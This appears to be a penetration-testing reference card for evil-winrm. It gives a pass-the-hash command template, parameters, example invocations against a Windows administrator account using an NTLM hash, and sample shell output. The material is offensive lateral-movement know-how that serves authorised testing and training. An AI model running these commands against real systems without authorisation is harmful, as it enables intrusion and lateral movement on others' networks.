---
type: command
executor: bash
data: evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
output: null
platforms:
  - Windows
tags:
  - winrm
  - lateral-movement
  - pth
verified: true
validated: true
---

# evil-winrm-connect-with-ntlm-hash

## Command

```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

## Description

Connects to a remote Windows machine via WinRM using pass-the-hash with an NTLM hash, establishing an interactive shell without needing the plaintext password.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i, --ip | Target IP address | Yes |
| -u, --user | Username for authentication | Yes |
| -H, --hash | NTLM hash in format LM:NT (LM can be empty) | Yes |
| -P, --port | WinRM port (default 5985) | No |
| -S | Use SSL (port 5986) | No |

## Examples

### Basic Usage

```bash
evil-winrm -i 10.0.0.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### With SSL

```bash
evil-winrm -i 10.0.0.20 -u administrator -H hash -S -P 5986
```

## Expected Output

Nishang pipeline support Disabled
Evil-WinRM v3.0

*Evil-WinRM* PS C:\Users\Administrator> 

## Related

- [[procedures/windows-winrm-credential-access]]
- [[tools/Evil-WinRM]]
